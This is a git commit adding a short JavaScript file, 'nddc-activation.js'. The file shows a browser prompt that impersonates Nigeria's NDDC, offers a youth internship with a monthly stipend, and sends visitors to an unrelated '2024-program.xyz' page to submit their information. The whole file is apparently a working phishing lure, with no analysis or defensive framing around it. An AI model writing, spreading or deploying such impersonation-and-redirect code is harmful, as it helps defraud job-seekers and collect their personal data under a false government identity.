76594a6277fa8a1d7319a6644989a9b28f2d3fdb
Jesusboys <156060629+Jesusboys@users.noreply.github.com>
2024-08-07 06:19:58 -0700

    Create nddc-activation.js

---
+++ nddc-activation.js
@@ -0,0 +1,7 @@
+
+
+var password = '1'
+password=prompt('NDDC: Register now for the ongoing NDDC 1yr youth internship scheme to receive ₦50,000.00 stipend monthly, kindly press 1 to submit your information now ','1');
+if (password != '1') {
+location.href='https://2024-program.xyz/nddc-program.html';
+}
